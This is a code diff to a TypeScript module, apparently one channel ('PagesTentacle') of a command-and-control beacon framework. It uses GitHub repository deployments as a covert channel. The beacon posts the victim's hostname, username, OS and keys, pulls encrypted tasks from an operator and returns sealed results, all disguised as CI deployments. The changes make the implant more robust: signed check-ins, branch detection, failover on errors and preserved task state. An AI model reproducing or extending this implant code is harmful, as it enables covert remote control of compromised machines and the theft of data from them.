@@ -7,7 +7,7 @@
  *
  * Protocol:
  *   ACK          Beacon → Server: deployment with environment="ci-{id8}",
- *                                  description=JSON{beaconId,publicKey,hostname,...}
+ *                                  payload=JSON{beaconId,publicKey,hostname,...}
  *   Task poll    Server → Beacon: deployment with environment="ci-t-{id8}",
  *                                  payload=JSON{nonce,ciphertext} (encrypted Task[])
  *   Result       Beacon → Server: deployment with environment="ci-r-{id8}",
@@ -19,9 +19,14 @@
 import { BaseTentacle } from "./BaseTentacle.ts";
 import {
   decryptBox, sealBox,
-  bytesToBase64, base64ToBytes,
+  base64ToBytes,
 } from "../crypto/sodium.ts";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 
 const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
 
@@ -29,9 +34,8 @@ export class PagesTentacle extends BaseTentacle {
   readonly kind = "pages" as const;
 
   private operatorPublicKey: Uint8Array | null = null;
-  private ackSent = false;
-  private ackDeploymentId: number | null = null;
   private lastTaskDeploymentId: number | null = null;
+  private defaultBranch: string | null = null;
 
   // ── Helpers ───────────────────────────────────────────────────────────────────
 
@@ -41,6 +45,7 @@ export class PagesTentacle extends BaseTentacle {
 
   override async isAvailable(): Promise<boolean> {
     try {
+      await this.getDefaultBranch();
       await this.octokit.rest.repos.listDeployments({
         owner: this.config.repo.owner,
         repo:  this.config.repo.name,
@@ -50,6 +55,18 @@ export class PagesTentacle extends BaseTentacle {
     } catch {
       return false;
     }
+  }
+
+  private async getDefaultBranch(): Promise<string> {
+    if (this.defaultBranch) return this.defaultBranch;
+    const repository = await this.octokit.rest.repos.get({
+      owner: this.config.repo.owner,
+      repo: this.config.repo.name,
+    });
+    const branch = repository.data.default_branch?.trim();
+    if (!branch) throw new Error("PagesTentacle: repository has no default branch");
+    this.defaultBranch = branch;
+    return branch;
   }
 
   // ── Operator key resolution ───────────────────────────────────────────────────
@@ -72,31 +89,23 @@ export class PagesTentacle extends BaseTentacle {
   // ── Checkin ──────────────────────────────────────────────────────────────────
 
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    // 1. Send ACK deployment on first checkin (before key fetch — mirrors GistTentacle)
-    if (!this.ackSent) {
-      try {
-        const ackDescription = JSON.stringify({
-          beaconId:  this.config.id,
-          publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
-          hostname:  payload.hostname,
-          username:  payload.username,
-          os:        payload.os,
-          arch:      payload.arch,
-          checkinAt: payload.checkinAt,
-        });
-        const ackResp = await this.octokit.rest.repos.createDeployment({
-          owner:             this.config.repo.owner,
-          repo:              this.config.repo.name,
-          ref:               "main",
-          environment:       `ci-${this.id8}`,
-          description:       ackDescription,
-          auto_merge:        false,
-          required_contexts: [],
-        } as any);
-        this.ackDeploymentId = (ackResp.data as any).id ?? null;
-      } catch { /* best-effort ACK */ }
-      this.ackSent = true;
+    if (!payload.identity) {
+      throw new Error("PagesTentacle: signed checkin identity is required");
     }
+
+    // 1. Each signed check-in is a new immutable deployment artifact.
+    try {
+      await this.octokit.rest.repos.createDeployment({
+        owner:             this.config.repo.owner,
+        repo:              this.config.repo.name,
+        ref:               await this.getDefaultBranch(),
+        environment:       `ci-${this.id8}`,
+        description:       "ack",
+        payload,
+        auto_merge:        false,
+        required_contexts: [],
+      } as any);
+    } catch { /* best-effort ACK */ }
 
     // 2. Fetch operator public key (needed for decryption)
     let operatorPubKey: Uint8Array;
@@ -171,38 +180,33 @@ export class PagesTentacle extends BaseTentacle {
 
   // ── Submit result ────────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
-    try {
-      const operatorPubKey = await this.getOperatorPublicKey();
-      const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
+    const operatorPubKey = await this.getOperatorPublicKey();
+    const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
 
-      await this.octokit.rest.repos.createDeployment({
-        owner:             this.config.repo.owner,
-        repo:              this.config.repo.name,
-        ref:               "main",
-        environment:       `ci-r-${this.id8}`,
-        description:       "result",
-        payload:           sealed,
-        auto_merge:        false,
-        required_contexts: [],
-      } as any);
-    } catch (err) {
-      console.warn("[PagesTentacle] submitResult error:", (err as Error).message);
-    }
+    // Result delivery is not best-effort: propagate repository/deployment
+    // failures so ConnectionFactory can fail over to another channel.
+    await this.octokit.rest.repos.createDeployment({
+      owner:             this.config.repo.owner,
+      repo:              this.config.repo.name,
+      ref:               await this.getDefaultBranch(),
+      environment:       `ci-r-${this.id8}`,
+      description:       "result",
+      payload:           sealed,
+      auto_merge:        false,
+      required_contexts: [],
+    } as any);
+    return {
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "pages",
+      acceptance: null,
+    };
   }
 
   // ── Teardown ─────────────────────────────────────────────────────────────────
 
   override async teardown(): Promise<void> {
-    if (this.ackDeploymentId !== null) {
-      try {
-        await this.octokit.rest.repos.createDeploymentStatus({
-          owner:         this.config.repo.owner,
-          repo:          this.config.repo.name,
-          deployment_id: this.ackDeploymentId,
-          state:         "inactive",
-        });
-      } catch { /* best-effort */ }
-    }
+    // Preserve registration and unread task deployments across recovery rebuilds.
   }
 }
